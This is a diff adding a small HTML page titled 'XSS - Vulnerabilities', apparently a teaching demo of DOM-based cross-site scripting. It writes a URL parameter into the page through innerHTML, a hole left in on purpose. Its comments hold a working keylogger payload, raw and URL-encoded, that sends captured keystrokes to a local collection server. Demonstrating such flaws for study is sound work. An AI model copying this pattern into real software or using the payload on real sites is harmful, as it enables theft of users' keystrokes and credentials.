@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS - Vulnerabilities</title>
+  </head>
+  <body>
+    <!-- Vulnerable Code -->
+    <div>Welcome, <span id="username"></span>!</div>
+    <div>Timezone: <span id="timezone"></span>!</div>
+
+    <script>
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = "expires=" + date.toUTCString();
+        document.cookie = name + "=" + value + ";" + expires + ";path=/";
+      }
+
+      setCookie("exampleCookie", "Hello, Cookie!");
+    </script>
+
+    <!-- Vulnerable Code -->
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const name = params.get("name");
+      document.getElementById("username").innerHTML = name;
+    </script>
+
+    <!-- encodeURIComponent(
+        `<img src="error.gif" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function (event) {if (event.which !== 0) {clearTimeout(timeout);buffer += String.fromCharCode(event.which);timeout = setTimeout(function () {var xhr = new XMLHttpRequest();var uri =\'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer);xhr.open(\'GET\', uri);xhr.send();buffer = \'\';}, 400);}});"/>`,
+      ); -->
+
+    <!-- After encodeURIComponent -->
+    <!-- %3Cimg%20src%3D%22error.gif%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20''%3B%20document.querySelector('body').addEventListener('keypress'%2C%20function%20(event)%20%7Bif%20(event.which%20!%3D%3D%200)%20%7BclearTimeout(timeout)%3Bbuffer%20%2B%3D%20String.fromCharCode(event.which)%3Btimeout%20%3D%20setTimeout(function%20()%20%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bvar%20uri%20%3D'http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D'%20%2B%20encodeURIComponent(buffer)%3Bxhr.open('GET'%2C%20uri)%3Bxhr.send()%3Bbuffer%20%3D%20''%3B%7D%2C%20400)%3B%7D%7D)%3B%22%2F%3E -->
+  </body>
+</html>
